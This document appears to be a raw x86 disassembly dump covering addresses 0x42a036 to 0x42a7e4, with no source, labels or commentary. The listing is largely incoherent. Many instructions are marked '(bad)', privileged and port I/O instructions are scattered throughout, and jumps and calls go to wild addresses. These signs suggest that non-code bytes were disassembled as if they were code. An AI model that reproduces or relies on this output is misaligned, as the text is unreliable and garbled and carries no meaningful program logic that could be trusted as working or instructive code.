  42a036:	add    BYTE PTR [ebx-0x4e72f41e],al
  42a03c:	(bad)  
  42a03d:	dec    BYTE PTR [ebx+0x45b1fc72]
  42a043:	(bad)  
  42a044:	sub    ebp,DWORD PTR [ebx]
  42a046:	and    al,0x52
  42a048:	(bad)  
  42a049:	dec    edi
  42a04a:	inc    ebp
  42a04b:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  42a052:	add    BYTE PTR [ebp-0x7b],dh
  42a055:	pop    eax
  42a056:	add    BYTE PTR [edx+0x0],bl
  42a059:	pop    edx
  42a05a:	dec    ebp
  42a05b:	jmp    DWORD PTR [ebx]
  42a05d:	and    al,0xec
  42a05f:	push   edx
  42a060:	out    0x64,eax
  42a062:	jmp    0xd3f49667
  42a067:	jmp    0x42a0c1
  42a069:	mov    al,0xfe
  42a06b:	dec    BYTE PTR [ebp-0x18fd8018]
  42a071:	add    BYTE PTR [esi+ebp*1],bh
  42a074:	pop    edx
  42a075:	icebp  
  42a076:	mov    eax,cs
  42a078:	ins    BYTE PTR es:[edi],dx
  42a079:	adc    eax,0x75510000
  42a07e:	mov    esi,0x70158
  42a083:	or     DWORD PTR [eax-0x74f48dfe],esi
  42a089:	mov    edi,esp
  42a08b:	cld    
  42a08c:	jge    0x42a103
  42a08e:	(bad)  
  42a090:	aas    
  42a091:	and    al,0x6d
  42a093:	adc    cl,0x1
  42a096:	mov    eax,DWORD PTR [eax]
  42a098:	and    ecx,DWORD PTR [ebx-0x167203fd]
  42a09e:	dec    ebp
  42a09f:	add    eax,ebp
  42a0a1:	add    BYTE PTR [edx],al
  42a0a3:	fadd   DWORD PTR [eax]
  42a0a5:	stc    
  42a0a6:	enter  0xee00,0x8b
  42a0aa:	sbb    eax,0x1
  42a0ad:	sbb    esi,ecx
  42a0af:	in     al,0x0
  42a0b1:	in     eax,dx
  42a0b2:	add    BYTE PTR [eax],al
  42a0b4:	jne    0x42a041
  42a0b6:	cmp    edx,esp
  42a0b8:	jb     0x42a0c3
  42a0ba:	jmp    0x42a131
  42a0bc:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  42a0c2:	add    BYTE PTR [ebx+0x4d83d840],cl
  42a0c8:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  42a0ce:	jb     0x42a059
  42a0d0:	pop    edx
  42a0d1:	fadd   QWORD PTR [ebx-0x7445faa1]
  42a0d7:	or     dh,BYTE PTR [edx+0x0]
  42a0da:	inc    edx
  42a0db:	or     dl,bh
  42a0dd:	xlat   BYTE PTR ds:[ebx]
  42a0de:	dec    edx
  42a0df:	push   edi
  42a0e0:	add    al,0x7
  42a0e2:	leave  
  42a0e3:	rol    DWORD PTR [edx+eax*1],0x7
  42a0e7:	add    ecx,ecx
  42a0e9:	mov    edx,ecx
  42a0eb:	int3   
  42a0ec:	jmp    0x42a0ac
  42a0ee:	mov    al,0x0
  42a0f0:	(bad)  
  42a0f1:	jne    0x42a0db
  42a0f3:	mov    eax,DWORD PTR [edx]
  42a0f5:	call   0xc1571dfa
  42a0fa:	pop    edi
  42a0fb:	add    ebx,DWORD PTR [ecx-0x37]
  42a0fe:	pop    ecx
  42a0ff:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  42a106:	push   es
  42a107:	mov    eax,DWORD PTR [eax]
  42a109:	int3   
  42a10a:	add    ch,al
  42a10c:	jae    0x42a0f6
  42a10e:	int    0x1
  42a110:	enter  0x3000,0x18
  42a114:	add    BYTE PTR [ebp+0x75],al
  42a117:	mov    esi,DWORD PTR [eax-0x171f0134]
  42a11d:	push   0x2
  42a11f:	pop    ecx
  42a120:	add    BYTE PTR [eax],cl
  42a122:	push   ebx
  42a123:	lea    edi,[edi+eax*2]
  42a126:	mov    al,0x1
  42a128:	jb     0x42a12a
  42a12a:	mov    al,0x10
  42a12c:	push   eax
  42a12d:	add    al,0x75
  42a12f:	add    BYTE PTR [ebx],ch
  42a131:	add    ebx,esp
  42a133:	int3   
  42a134:	jne    0x42a146
  42a136:	movsx  edx,cl
  42a139:	add    DWORD PTR [eax],eax
  42a13b:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  42a142:	mov    gs,edi
  42a144:	add    BYTE PTR [eax-0x50],ch
  42a147:	add    al,ch
  42a149:	mov    eax,DWORD PTR [ecx]
  42a14b:	sub    eax,DWORD PTR [eax]
  42a14d:	jb     0x42a1c4
  42a14f:	add    DWORD PTR [esp+eiz*8-0x50],esi
  42a153:	jge    0x42a13d
  42a155:	add    al,0x1
  42a157:	add    DWORD PTR [eax],0x0
  42a15a:	jne    0x42a15c
  42a15c:	je     0x42a1a3
  42a15e:	mov    eax,DWORD PTR [edi]
  42a160:	ror    BYTE PTR [ebp+0x4d],1
  42a163:	or     DWORD PTR [ecx+0x4d03d004],0x3
  42a16a:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  42a170:	mov    DWORD PTR [ebx],ebp
  42a172:	fadd   DWORD PTR [eax+0x75]
  42a175:	inc    eax
  42a176:	pop    eax
  42a177:	lea    ebx,[ecx+0x4f]
  42a17a:	push   0xb1000003
  42a17f:	out    dx,eax
  42a180:	add    ebp,DWORD PTR [edx+edx*2]
  42a183:	add    BYTE PTR [ebx+ecx*4],bh
  42a186:	mov    ch,BYTE PTR [ebx]
  42a188:	jb     0x42a1fc
  42a18a:	add    al,0x89
  42a18c:	push   eax
  42a18d:	call   0x842aeeff
  42a192:	add    DWORD PTR [eax+eax*1],eax
  42a195:	jae    0x42a1ab
  42a197:	icebp  
  42a198:	inc    ebp
  42a199:	mov    eax,DWORD PTR gs:[ecx]
  42a19c:	int3   
  42a19d:	out    dx,al
  42a19e:	loopne 0x42a1ed
  42a1a0:	sub    eax,DWORD PTR [edx]
  42a1a2:	push   0xffffff83
  42a1a4:	pop    esi
  42a1a5:	push   cs
  42a1a6:	jl     0x42a1c1
  42a1a8:	add    al,0xaf
  42a1aa:	xor    eax,0x832b6d00
  42a1af:	mov    eax,DWORD PTR [edx]
  42a1b1:	rcr    BYTE PTR [ebp+0x754500dc],cl
  42a1b7:	ror    DWORD PTR [ebx+0x7dc8e803],1
  42a1bd:	inc    ebp
  42a1be:	shr    ebx,0x3
  42a1c1:	or     DWORD PTR [eax],0x4
  42a1c4:	push   0xffffffa5
  42a1c6:	pop    esi
  42a1c7:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  42a1ce:	jmp    0x42a22d
  42a1d0:	mov    edi,0xff0272
  42a1d5:	fdivr  QWORD PTR [ebp+0x5d]
  42a1d8:	push   0x4e
  42a1da:	pop    ecx
  42a1db:	call   0x42e5e0
  42a1e0:	mov    DWORD PTR [ebx],eax
  42a1e2:	in     al,0xc8
  42a1e4:	rol    BYTE PTR [ebp-0x75],0xc1
  42a1e8:	call   0xaca3c9
  42a1ed:	pop    esi
  42a1ee:	enter  0xceff,0x8b
  42a1f2:	repz mov ecx,DWORD PTR [ebp-0x34]
  42a1f6:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  42a1fd:	je     0x42a1ff
  42a1ff:	or     DWORD PTR [ebx-0x74183b24],eax
  42a205:	jne    0x42a1eb
  42a207:	jmp    0x42a202
  42a209:	push   DWORD PTR [edx-0x24]
  42a20c:	push   0x4d
  42a20e:	pop    ecx
  42a20f:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  42a213:	jge    0x42a21b
  42a215:	mov    eax,eax
  42a217:	sub    ebp,DWORD PTR [edx+0x24]
  42a21a:	pop    esi
  42a21b:	inc    ebp
  42a21c:	mov    esp,0x8b6077
  42a221:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  42a227:	lods   al,BYTE PTR ds:[esi]
  42a228:	add    BYTE PTR [ebx],bh
  42a22a:	enter  0xce73,0x49
  42a22e:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  42a236:	stc    
  42a237:	jge    0x42a2ab
  42a239:	jnp    0xdd42259a
  42a23f:	call   0xc5a315
  42a244:	fadd   st(0),st
  42a246:	dec    esi
  42a247:	ins    BYTE PTR es:[edi],dx
  42a248:	stc    
  42a249:	cmp    al,0x73
  42a24b:	push   ebp
  42a24c:	mov    eax,0xf8028b
  42a251:	jne    0x42a214
  42a253:	mov    esi,ecx
  42a255:	mov    esp,DWORD PTR [ebp+0x2c]
  42a258:	add    edi,DWORD PTR [ebp-0x24]
  42a25b:	sub    esp,eax
  42a25d:	and    al,0x45
  42a25f:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  42a265:	sbb    al,0xee
  42a267:	pop    esi
  42a268:	call   0x82a298
  42a26d:	fsubr  st,st(3)
  42a26f:	sti    
  42a270:	add    BYTE PTR gs:[ecx],bh
  42a273:	add    eax,esp
  42a275:	add    DWORD PTR [esi],eax
  42a277:	rol    DWORD PTR [ebp+0x8],0x29
  42a27b:	mov    esp,eax
  42a27d:	clc    
  42a27e:	jne    0x42a2f5
  42a280:	mov    eax,0x8b0673
  42a285:	loopne 0x42a2cc
  42a287:	loopne 0x42a212
  42a289:	lods   al,BYTE PTR ds:[esi]
  42a28a:	int3   
  42a28b:	inc    ebp
  42a28c:	mov    DWORD PTR gs:[eax+edi*8],eax
  42a290:	add    al,0xc3
  42a292:	sub    ecx,DWORD PTR [ebp+0x47]
  42a295:	(bad)  
  42a297:	shr    BYTE PTR [ebp-0x1f],0xe8
  42a29b:	add    eax,DWORD PTR [eax]
  42a29d:	call   0x64463a2
  42a2a2:	add    esi,DWORD PTR [esi-0x3b2efc83]
  42a2a8:	dec    esi
  42a2a9:	ins    DWORD PTR es:[edi],dx
  42a2aa:	in     al,dx
  42a2ab:	lea    eax,[eax]
  42a2ad:	inc    ebp
  42a2ae:	inc    ebp
  42a2af:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  42a2b5:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  42a2bf:	and    al,0xdc
  42a2c1:	ror    DWORD PTR [edx+0x24],0xf7
  42a2c5:	or     BYTE PTR [ebp+0x4c],dh
  42a2c8:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  42a2cc:	stos   BYTE PTR es:[edi],al
  42a2cd:	adc    edx,edi
  42a2cf:	inc    esp
  42a2d0:	add    edi,DWORD PTR [eax]
  42a2d2:	jne    0x42a2b7
  42a2d4:	mov    DWORD PTR [eax-0x7449db04],ecx
  42a2da:	cmp    ecx,DWORD PTR [edi]
  42a2dc:	sub    BYTE PTR [ebp-0x7e],dl
  42a2df:	sar    ebp,0xb
  42a2e2:	jmp    FWORD PTR [edi+0x2400392a]
  42a2e8:	sub    esi,DWORD PTR [ebx-0x73]
  42a2eb:	mov    esp,DWORD PTR [ecx+edi*4]
  42a2ee:	mov    ecx,DWORD PTR [eax]
  42a2f0:	and    BYTE PTR [eax],al
  42a2f2:	jne    0x42a2be
  42a2f4:	sub    ebp,ecx
  42a2f6:	sbb    BYTE PTR [esi+0x32],ah
  42a2f9:	dec    ebp
  42a2fa:	push   ebp
  42a2fb:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  42a301:	ret    
  42a302:	mov    edx,ebp
  42a304:	leave  
  42a305:	sub    DWORD PTR [esi+0x24],ebx
  42a308:	ret    0x2b
  42a30b:	pop    ax
  42a30d:	push   ebp
  42a30e:	rol    BYTE PTR [ebx],0xeb
  42a311:	add    DWORD PTR [ecx+0x6c0001],0x40
  42a318:	jb     0x42a36f
  42a31a:	ret    
  42a31b:	in     al,dx
  42a31c:	jecxz  0x42a2a9
  42a31e:	push   esi
  42a31f:	xchg   esp,eax
  42a320:	jne    0x42a322
  42a322:	cmp    edx,DWORD PTR [esi+0x1c]
  42a325:	jne    0x42a30b
  42a327:	mov    eax,DWORD PTR [ebp-0x77]
  42a32a:	ror    DWORD PTR [ebx+0x899408],0xe0
  42a331:	mov    esi,DWORD PTR [ebp-0x75]
  42a334:	pop    esi
  42a335:	nop
  42a336:	mov    eax,DWORD PTR [eax]
  42a338:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  42a33e:	add    al,0x0
  42a340:	inc    ebp
  42a341:	mov    eax,DWORD PTR [ebx]
  42a343:	mov    ebp,ebx
  42a345:	cmp    al,0xf
  42a347:	or     al,al
  42a349:	inc    ebp
  42a34a:	inc    ebp
  42a34b:	xor    eax,0x8bc89c8b
  42a350:	ins    BYTE PTR es:[edi],dx
  42a351:	cld    
  42a352:	add    BYTE PTR [edi+0x576c16c0],dh
  42a358:	add    BYTE PTR [ecx-0x5],dl
  42a35b:	add    eax,0x17200
  42a360:	sbb    al,0x85
  42a362:	dec    esp
  42a363:	je     0x42a39d
  42a365:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  42a369:	add    BYTE PTR [ebx],bh
  42a36b:	(bad)  
  42a36c:	and    al,0x34
  42a36e:	jae    0x42a30c
  42a370:	mov    cl,cl
  42a372:	inc    DWORD PTR [esp]
  42a375:	push   ebp
  42a376:	shr    esp,0x8
  42a379:	in     al,dx
  42a37a:	push   esp
  42a37b:	add    DWORD PTR [eax],esp
  42a37d:	add    bl,cl
  42a37f:	inc    ebp
  42a380:	mov    bh,0x53
  42a382:	add    BYTE PTR [ebp-0x17],al
  42a385:	push   esi
  42a386:	cmovne ecx,edx
  42a389:	xor    al,0x4c
  42a38b:	pushf  
  42a38c:	and    BYTE PTR [edi+0x17],dl
  42a38f:	xor    eax,0x89009cd9
  42a394:	add    ah,bh
  42a396:	sub    eax,DWORD PTR [ebp-0x3f]
  42a399:	aad    0x5
  42a39b:	inc    ebp
  42a39c:	add    eax,edx
  42a39e:	add    BYTE PTR [ebp-0x40],al
  42a3a1:	xlat   BYTE PTR ds:[ebx]
  42a3a2:	ins    BYTE PTR es:[edi],dx
  42a3a3:	inc    ebp
  42a3a4:	inc    eax
  42a3a5:	and    ecx,eax
  42a3a7:	dec    ecx
  42a3a8:	add    eax,0x202e4c45
  42a3ad:	inc    ebp
  42a3ae:	fnstcw WORD PTR [ecx+ebp*1-0x37]
  42a3b2:	add    BYTE PTR [esi+0xc000c0],bh
  42a3b8:	lea    eax,[esp-0x34]
  42a3bc:	ret    
  42a3bd:	mov    dh,0x8b
  42a3bf:	xor    edx,DWORD PTR [ecx+0x3]
  42a3c2:	mov    al,BYTE PTR [ecx+0x1]
  42a3c5:	sbb    BYTE PTR [eax],al
  42a3c7:	stc    
  42a3c8:	mov    esi,DWORD PTR [edx+0x8]
  42a3cb:	(bad)  
  42a3cc:	les    esi,FWORD PTR ss:[ecx]
  42a3cf:	(bad)  
  42a3d0:	mov    al,ch
  42a3d2:	add    esi,eax
  42a3d4:	add    dh,al
  42a3d6:	or     esi,eax
  42a3d8:	mov    dl,0xc7
  42a3da:	add    esi,eax
  42a3dc:	add    al,cl
  42a3de:	push   cs
  42a3df:	mov    BYTE PTR [edx+0xc601c9],0xca
  42a3e6:	or     BYTE PTR [ebx],dh
  42a3e8:	dec    ecx
  42a3e9:	lea    eax,[ebx]
  42a3eb:	or     eax,0x18fc0fc7
  42a3f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a3f1:	(bad)  
  42a3f3:	fiadd  WORD PTR [ebp-0x78]
  42a3f6:	jae    0xed77ab45
  42a3fc:	or     BYTE PTR [ebp+0x7],al
  42a3ff:	loope  0x42a39f
  42a401:	inc    ebp
  42a402:	xor    dl,ah
  42a404:	pop    esi
  42a405:	inc    ebp
  42a406:	shr    eax,0xc
  42a409:	inc    ebp
  42a40a:	and    ch,0x1
  42a40d:	inc    ebp
  42a40e:	add    bh,bl
  42a410:	add    BYTE PTR [ebp-0x7b],al
  42a413:	in     al,dx
  42a414:	clc    
  42a415:	inc    ebp
  42a416:	ret    0xd7
  42a419:	inc    ebp
  42a41a:	mov    edi,DWORD PTR [ecx+eax*4-0x37]
  42a41e:	sub    al,0x44
  42a420:	add    BYTE PTR [ebx+ecx*4-0x76cce34a],bh
  42a427:	add    ebx,DWORD PTR [ecx+eax*2]
  42a42a:	(bad)  
  42a42b:	sbb    al,ah
  42a42d:	stc    
  42a42e:	test   DWORD PTR [edx-0x8],esi
  42a431:	lea    edi,[edi-0x7007aa4]
  42a437:	mov    DWORD PTR [ebp-0x24],edi
  42a43a:	(bad)  
  42a43b:	dec    ebp
  42a43c:	int3   
  42a43d:	mov    eax,0x71cdfcc6
  42a442:	mov    BYTE PTR [ecx],0xce
  42a445:	(bad)  
  42a446:	(bad)  
  42a447:	dec    edi
  42a449:	jmp    FWORD PTR [edx-0x38]
  42a44c:	(bad)  
  42a44d:	or     dl,al
  42a44f:	jge    0x42a417
  42a451:	(bad)  
  42a452:	shl    esp,1
  42a454:	xor    eax,DWORD PTR [ebp+0x45cbf85a]
  42a45a:	add    BYTE PTR [ebx+0xd8c8d],cl
  42a460:	rdpmc  
  42a462:	sbb    BYTE PTR [edi+0x7de08da],bh
  42a468:	mov    BYTE PTR [esi+0x39063283],bl
  42a46e:	in     eax,dx
  42a46f:	cmovne ebx,DWORD PTR [edx]
  42a472:	jecxz  0x42a474
  42a474:	inc    ebp
  42a475:	mov    esp,ecx
  42a477:	sbb    al,0x45
  42a479:	mov    ebx,edx
  42a47b:	add    DWORD PTR [ebp+0x0],eax
  42a47e:	out    dx,al
  42a47f:	add    DWORD PTR [ebp+0x4d],eax
  42a482:	and    DWORD PTR [ebx+0x2e8045],ecx
  42a488:	inc    ebp
  42a489:	mov    DWORD PTR [edx+ebp*2-0x37],edi
  42a48d:	mov    DWORD PTR [esp+edx*8-0x3c],0x33e5b6d4
  42a495:	inc    ebp
  42a496:	add    ebx,edi
  42a498:	inc    ecx
  42a499:	xlat   BYTE PTR ds:[ebx]
  42a49a:	sbb    BYTE PTR [ebp-0x758d2b07],cl
  42a4a0:	(bad)  
  42a4a1:	xor    bh,BYTE PTR [eax+eax*4+0x8bd35c6]
  42a4a8:	(bad)  
  42a4a9:	dec    esi
  42a4aa:	mov    esi,0xbf45c6f3
  42a4af:	mov    esi,eax
  42a4b1:	fadd   st,st(0)
  42a4b3:	inc    esi
  42a4b5:	(bad)  
  42a4b6:	rcl    esp,0xc6
  42a4b9:	inc    edx
  42a4bb:	push   eax
  42a4bc:	mov    BYTE PTR [ebp-0x3d],0x33
  42a4c0:	xor    eax,DWORD PTR [ebx]
  42a4c2:	lea    edx,[eax+0xd]
  42a4c5:	inc    ebp
  42a4c6:	jae    0x8c1d0ae4
  42a4cc:	ficomp WORD PTR [eax+ecx*4]
  42a4cf:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  42a4d6:	test   esi,edi
  42a4d8:	(bad)  
  42a4d9:	(bad)  
  42a4da:	inc    DWORD PTR [eax]
  42a4dc:	inc    ebp
  42a4dd:	add    BYTE PTR [ebx-0x10aa23d0],cl
  42a4e3:	mov    edx,DWORD PTR [ebx]
  42a4e5:	cld    
  42a4e6:	mov    edi,ecx
  42a4e8:	mov    ecx,ebx
  42a4ea:	pop    esp
  42a4eb:	sar    edi,0x1e
  42a4ee:	cmp    ebp,esi
  42a4f0:	jne    0x42a565
  42a4f2:	mov    DWORD PTR ds:0x22450be4,ecx
  42a4f8:	loop   0x42a4e8
  42a4fa:	pushf  
  42a4fb:	jae    0x42a488
  42a4fd:	add    eax,0x3388e91c
  42a502:	add    esi,ebp
  42a504:	add    BYTE PTR [ebx-0x40],dh
  42a507:	jmp    0x93a563
  42a50c:	mov    ebx,0x6a7275
  42a511:	pop    ecx
  42a512:	add    DWORD PTR [ebp+eax*4-0x77],esi
  42a516:	add    bh,BYTE PTR [eax+0x0]
  42a519:	dec    DWORD PTR [ebp+0x66]
  42a51c:	mov    ecx,DWORD PTR [ebp-0xff0084]
  42a522:	mov    DWORD PTR [edx-0x75],ebp
  42a525:	data16 sbb al,0x8d
  42a528:	mov    edi,edi
  42a52a:	add    edi,edi
  42a52c:	add    BYTE PTR [edx+0x1],ch
  42a52f:	data16 or BYTE PTR [ebp-0x1e00bb],cl
  42a536:	call   0xd8906ca1
  42a53b:	push   0xffffffec
  42a53d:	pop    ecx
  42a53e:	jl     0x42a4c9
  42a540:	inc    ebp
  42a541:	sbb    BYTE PTR [esi-0x37],0x8
  42a545:	test   edx,ecx
  42a547:	(bad)  
  42a548:	jmp    0x41032e4c
  42a54d:	push   ebp
  42a54e:	jne    0x42a5b6
  42a550:	lea    ecx,[ebp-0x2c]
  42a553:	mov    DWORD PTR [ebp-0x200158],0xfe4585d4
  42a55d:	into   
  42a55e:	(bad)  
  42a55f:	jmp    0x42a4ec
  42a561:	(bad)  
  42a562:	loopne 0x42a514
  42a564:	(bad)  
  42a565:	rol    ebx,cl
  42a567:	call   0xdf5eeaf7
  42a56c:	shr    cl,0x50
  42a56f:	inc    bp
  42a571:	inc    ebp
  42a572:	mov    eax,ebp
  42a574:	cwde   
  42a575:	mov    DWORD PTR [eax],0xd4ffc7d4
  42a57b:	add    bh,bh
  42a57d:	add    BYTE PTR [ecx],al
  42a57f:	call   0x141bd84
  42a584:	inc    DWORD PTR [ebp-0xb201f8]
  42a58a:	xor    eax,DWORD PTR [ebp-0xc401fd]
  42a590:	jne    0x42a51d
  42a592:	mov    eax,ds:0x33c70be0
  42a597:	ret    
  42a598:	out    dx,eax
  42a599:	mov    edx,DWORD PTR ds:0xbc0a31c
  42a59f:	push   eax
  42a5a0:	xor    eax,DWORD PTR [ebp-0x71]
  42a5a3:	mov    esi,DWORD PTR [edx-0x68]
  42a5a6:	mov    ds:0x33ff0b00,eax
  42a5ab:	(bad)  
  42a5ac:	mov    ecx,0x8b8d0008
  42a5b1:	call   FWORD PTR [edi+edi*8]
  42a5b4:	and    bh,bh
  42a5b6:	push   0x66
  42a5b8:	mov    bp,0xff8d
  42a5bc:	(bad)  
  42a5bd:	(bad)  
  42a5be:	dec    DWORD PTR [edi]
  42a5c0:	mov    DWORD PTR [edx],eax
  42a5c2:	jp     0x42a5c4
  42a5c4:	(bad)  
  42a5c5:	mov    ecx,0x774f59
  42a5ca:	mov    ecx,eax
  42a5cc:	jl     0x42a557
  42a5ce:	dec    DWORD PTR [eax-0x74c73fa7]
  42a5d4:	mov    DWORD PTR [esi+0x7e],esp
  42a5d7:	push   ebp
  42a5d8:	dec    DWORD PTR [ebp-0x7676f2a7]
  42a5de:	or     BYTE PTR [ebx+eiz*2+0x4d6666c2],0x55
  42a5e6:	xor    ecx,DWORD PTR [ebp-0x7627ec77]
  42a5ec:	call   DWORD PTR [eax+0x668dc233]
  42a5f2:	test   al,0x55
  42a5f4:	mov    DWORD PTR [ebp-0x76bade7c],ecx
  42a5fa:	int3   
  42a5fb:	xchg   esp,eax
  42a5fc:	loopne 0x42a587
  42a5fe:	(bad)  
  42a5ff:	xchg   esi,eax
  42a600:	lods   al,BYTE PTR ds:[esi]
  42a601:	ret    0x8bd3
  42a604:	in     eax,dx
  42a605:	inc    bp
  42a607:	dec    ebp
  42a608:	loop   0x42a5c3
  42a60a:	ds dec edi
  42a60c:	mov    DWORD PTR [eax],0x89eaf1b4
  42a612:	loope  0x42a678
  42a614:	(bad)  
  42a615:	(bad)  
  42a616:	mov    eax,0x85667c8b
  42a61b:	mov    ch,0xfe
  42a61d:	(bad)  
  42a61e:	(bad)  
  42a61f:	inc    DWORD PTR [eax]
  42a621:	jno    0x42a623
  42a623:	data16 mov bl,0xb5
  42a626:	add    bh,bh
  42a628:	mov    edi,edi
  42a62a:	fmul   QWORD PTR [ecx-0x729501]
  42a630:	aam    0x8d
  42a632:	call   ebx
  42a634:	push   eax
  42a635:	mov    DWORD PTR [ebp+0x6c],eax
  42a638:	xor    edi,edi
  42a63a:	add    eax,DWORD PTR [ebx-0x76bafcb0]
  42a640:	sub    DWORD PTR [esi+0x44],0xffffffff
  42a644:	mov    ecx,DWORD PTR [ebp-0x767f1ee4]
  42a64a:	add    DWORD PTR [eax+0x0],esi
  42a64d:	push   DWORD PTR [eax]
  42a64f:	push   bp
  42a651:	lea    ecx,[ebp-0x8701]
  42a657:	mov    DWORD PTR [ecx+0x74],edx
  42a65a:	sar    bh,1
  42a65c:	or     DWORD PTR [ebx-0x48000386],0x77
  42a663:	fs test edi,edi
  42a666:	add    al,0x33
  42a668:	add    BYTE PTR [ebx],al
  42a66a:	adc    dh,BYTE PTR [ebx]
  42a66c:	add    BYTE PTR [esi-0x75],ah
  42a66f:	test   DWORD PTR [esi-0x1],esp
  42a672:	inc    ebp
  42a673:	inc    DWORD PTR [ebx-0x2ff00abb]
  42a679:	dec    ebp
  42a67a:	mov    DWORD PTR [ebx],esi
  42a67c:	mov    al,BYTE PTR [ebx]
  42a67e:	push   ecx
  42a67f:	xor    esp,DWORD PTR [esi+0x66]
  42a682:	push   ebp
  42a683:	inc    ebp
  42a684:	xor    DWORD PTR [ebx],0x8
  42a687:	mov    WORD PTR [ebp-0x72],ax
  42a68b:	push   cx
  42a68d:	inc    ebp
  42a68e:	adc    WORD PTR [ebp-0x64],0xff83
  42a693:	mov    DWORD PTR [ebx],0x92b589f8
  42a699:	clc    
  42a69a:	push   ecx
  42a69b:	inc    ebp
  42a69c:	data16 cmc 
  42a69e:	push   ebp
  42a69f:	pushf  
  42a6a0:	data16 (bad) 
  42a6a2:	dec    ebp
  42a6a3:	in     al,0x83
  42a6a5:	test   DWORD PTR [edi-0x76ba3508],eax
  42a6ab:	xor    ebx,DWORD PTR [eax+0xc7329c]
  42a6b1:	in     al,0x8b
  42a6b3:	add    eax,0x45b5f866
  42a6b8:	dec    DWORD PTR [ebx+0xf094ff]
  42a6be:	mov    DWORD PTR [ecx+0x45fff466],ecx
  42a6c4:	lea    ecx,[ebx-0x4e76e3b3]
  42a6ca:	push   0x6600ff01
  42a6cf:	push   cs
  42a6d0:	test   DWORD PTR [eax+0xff01ff],eax
  42a6d6:	inc    ecx
  42a6d7:	inc    ebp
  42a6d8:	mov    WORD PTR [ebp-0x360018],ax
  42a6df:	push   cs
  42a6e0:	shl    BYTE PTR [ebp+0x66],0x8b
  42a6e4:	test   DWORD PTR [edi+edi*8],ebx
  42a6e7:	cs (bad) 
  42a6e9:	inc    DWORD PTR [ecx-0x75]
  42a6ec:	data16 in al,dx
  42a6ee:	test   DWORD PTR [eax],ecx
  42a6f0:	inc    DWORD PTR [eax]
  42a6f2:	inc    DWORD PTR [ecx-0x77]
  42a6f5:	mov    esi,DWORD PTR [edx-0x77]
  42a6f8:	call   FWORD PTR [eax]
  42a6fa:	leavew 
  42a6fc:	xchg   ebp,eax
  42a6fd:	inc    edi
  42a6fe:	push   DWORD PTR [ebp-0x1]
  42a701:	call   0xff52924b
  42a706:	lea    eax,[ebp-0x1]
  42a709:	mov    edi,edi
  42a70b:	enter  0xc7,0xc3
  42a70f:	mov    eax,ecx
  42a711:	xor    ecx,DWORD PTR [ecx-0x749bfd]
  42a717:	sbb    al,0x8b
  42a719:	sbb    esp,edi
  42a71b:	dec    ebp
  42a71c:	mov    bh,0x8b
  42a71e:	mov    ah,cl
  42a720:	mov    DWORD PTR [eax],0x8bc1ffc3
  42a726:	mov    eax,ebx
  42a728:	mov    BYTE PTR [eax],al
  42a72a:	sar    bh,0x89
  42a72d:	sub    BYTE PTR [eax-0x77ff766c],cl
  42a733:	mov    esp,DWORD PTR [ebp+0x7c]
  42a736:	add    BYTE PTR [eax],al
  42a738:	inc    ebp
  42a739:	mov    esi,DWORD PTR ds:0xc7049c8d
  42a73f:	or     ah,bl
  42a741:	add    BYTE PTR [ebp+0x458bf800],0x85
  42a748:	xor    DWORD PTR [edi],ecx
  42a74a:	pushf  
  42a74b:	js     0x42a714
  42a74d:	add    al,dh
  42a74f:	mov    eax,DWORD PTR [ebp+0x4509f8f4]
  42a755:	inc    eax
  42a756:	xor    eax,0x8b209f89
  42a75b:	call   FWORD PTR [ebx+ecx*4]
  42a75e:	cmp    al,0x1
  42a761:	mov    DWORD PTR [eax],0x8b8545c3
  42a767:	call   FWORD PTR [edi+edi*8]
  42a76a:	dec    ebp
  42a76b:	inc    ebp
  42a76c:	mov    eax,DWORD PTR [ebx-0xffe374]
  42a772:	mov    eax,DWORD PTR [eax]
  42a774:	mov    eax,edi
  42a776:	nop
  42a777:	ret    
  42a778:	add    BYTE PTR [ebp-0x130077],al
  42a77e:	jne    0x42a705
  42a780:	test   edi,edi
  42a782:	jne    0x42a783
  42a784:	dec    DWORD PTR [ebx-0x38aa1fe8]
  42a78a:	call   0xffcea452
  42a78f:	sbb    al,0x45
  42a791:	stos   BYTE PTR es:[edi],al
  42a792:	mov    eax,DWORD PTR [eax]
  42a794:	mov    edx,DWORD PTR [eax+0x3]
  42a797:	inc    ebp
  42a798:	cmp    al,0x8b
  42a79a:	push   cs
  42a79b:	cwde   
  42a79c:	inc    ebp
  42a79d:	add    BYTE PTR [ebp-0xe78b39],al
  42a7a3:	call   FWORD PTR [esp+eax*1]
  42a7a6:	test   eax,0x8bffff00
  42a7ab:	mov    DWORD PTR [esp+eiz*4],ebx
  42a7ae:	adc    BYTE PTR [ebp+0x1],0x8b
  42a7b2:	add    al,ch
  42a7b4:	add    al,dh
  42a7b6:	mov    DWORD PTR [ebp-0x3d],0x7589458b
  42a7bd:	mov    ecx,DWORD PTR [ebx-0x76cfe314]
  42a7c3:	inc    ebp
  42a7c4:	add    DWORD PTR [ebx-0x7aceb000],ecx
  42a7ca:	cmp    bh,0x1
  42a7cd:	inc    DWORD PTR [eax]
  42a7cf:	inc    ebp
  42a7d0:	push   eax
  42a7d1:	xor    ebp,ecx
  42a7d3:	add    eax,DWORD PTR [edx]
  42a7d5:	mov    DWORD PTR [eax],eax
  42a7d7:	and    al,0x80
  42a7d9:	inc    DWORD PTR [ecx]
  42a7db:	lea    eax,[eax]
  42a7dd:	pushf  
  42a7de:	or     BYTE PTR [ebp-0xfe00bb],al
  42a7e4:	jmp    0x141aa6e
